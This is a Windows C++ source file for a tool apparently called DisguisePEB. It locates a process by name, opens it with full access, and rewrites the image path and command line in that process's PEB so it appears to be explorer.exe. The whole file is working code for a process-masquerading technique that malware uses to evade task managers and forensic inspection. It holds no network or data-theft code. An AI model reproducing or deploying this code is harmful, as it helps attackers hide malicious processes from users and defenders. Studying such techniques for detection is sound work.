#include <stdio.h>
#include <Windows.h>
#include <winternl.h> //PEB Structures, NtQueryInformationProcess
#include <TlHelp32.h>

//prepare for call NtQueryInformationProcess func
typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );

// modify ImagePathName and CommandLine in PEB of specific process
BOOL DisguiseProcess(DWORD dwProcessId, wchar_t* lpwszPath, wchar_t* lpwszCmd) {
    
    // get handle of process
    /*
    OpenProcess(访问权限, 进程句柄是否被继承, 要被打开的进程PID)
    */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL) {
        printf("Open Process error!");
        return FALSE;
    }

    // prepare for getting PEB
    typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    PEB peb = { 0 };
    RTL_USER_PROCESS_PARAMETERS Param = { 0 };
    USHORT usCmdLen = 0;
    USHORT usPathLen = 0;
    const WCHAR* NTDLL = L"ntdll.dll";

    //NtQueryInformationProcess这个函数没有关联的导入库，必须使用LoadLibrary和GetProcessAddress函数从Ntdll.dll中获取该函数地址
    NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibrary(NTDLL), "NtQueryInformationProcess");
    if (NULL == NtQueryInformationProcess)
    {
        printf("GetProcAddress Error");
        return FALSE;
    }
    
    // get status of specific process
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (!NT_SUCCESS(status))
    {
        printf("NtQueryInformationProcess failed");
        return FALSE;
    }

    // get PebBaseAddress in PROCESS_BASIC_INFORMATION of prococess
    ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    // get ProcessParameters in PEB of process
    ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);

    // modify cmdline data
    usCmdLen = 2 + 2 * wcslen(lpwszCmd); // cal lenth of unicode str
    WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL);
    WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
    // modify path data
    usPathLen = 2 + 2 * wcslen(lpwszPath); // cal lenth of unicode str
    WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
    WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);

    return TRUE;
}

// get PID by ProcessName
DWORD FindProcId(const WCHAR* ProcName) {
    DWORD ProcId = 0; // target procId
    PROCESSENTRY32 pe32 = { 0 };  // to get snapshot structure
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hProcessShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // get snapshot list
    if (hProcessShot == INVALID_HANDLE_VALUE) {
        puts("get proc list error");
        return 0;
    }
    BOOL cProc = Process32First(hProcessShot, &pe32); // prepare for loop of proc snapshot list
    // compare proc name and get correct process Id
    while (cProc) {
        if (wcscmp(pe32.szExeFile, ProcName) == 0) {
            ProcId = pe32.th32ProcessID;
            break;
        }
        cProc = Process32Next(hProcessShot, &pe32);
    }
    return ProcId;
}

int main(int argc, char* argv[])
{
    if (argc == 2) {
        size_t len = strlen(argv[1]) + 1;
        size_t converted = 0;
        wchar_t* pws = new wchar_t[len];
        mbstowcs_s(&converted, pws, len, argv[1], _TRUNCATE);

        WCHAR* ProcessName = pws;
        do {
            DWORD dwTargetId = FindProcId(ProcessName);
            if (0 == dwTargetId) {
                printf("can not find procIdn\n");
                break;
            }
            if (FALSE == DisguiseProcess(dwTargetId, (wchar_t*)L"C:\\Windows\\explorer.exe", (wchar_t*)L"C:\\Windows\\Explorer.EXE"))
            {
                printf("Dsisguise Process Error.\n");
                break;
            }
            printf("Disguise Process OK.\n");
        } while (FALSE);

        system("pause");
    }
    else {
        printf("Usage: DisguisePEB.exe ProcessFileName\n");
    }
    return 0;
}

